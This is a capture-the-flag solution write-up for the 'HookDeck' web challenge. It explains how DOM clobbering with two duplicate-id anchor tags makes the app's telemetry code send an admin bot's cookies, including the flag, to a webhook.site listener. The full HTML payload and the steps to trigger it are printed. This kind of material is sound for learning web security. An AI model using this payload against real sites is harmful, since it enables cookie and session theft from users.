Solution Writeup: HookDeck

The Vulnerability
The app prevents standard XSS by stripping scripts, but it's vulnerable to DOM Clobbering. The telemetry system blindly trusts window.webhookConfig.url to determine where to send the user's cookies.

The Payload
HTML

<a id="webhookConfig"></a>
<a id="webhookConfig" name="url" href="https://webhook.site/YOUR-UNIQUE-ID"></a>

Why it Works

    The Object Trick: By injecting two elements with the exact same id="webhookConfig", the browser automatically groups them into an HTMLCollection on the global window object.

    The Property Trick: The second tag has name="url". Because it's in an HTMLCollection, the JavaScript can access it as window.webhookConfig.url.

    The Extraction: When the fetch() function tries to use that HTML element as a web address, it implicitly converts the anchor tag (<a>) to a text string. This automatically returns the href value.

Steps to Solve

    Generate a free listener URL on webhook.site.

    Put your URL into the payload and submit it into the challenge template builder.

    Click "Submit Pipeline to Integration Admin" to trigger the admin bot.

    Check your webhook dashboard. You will see a POST request containing the GZCTF_FLAG in the JSON body!
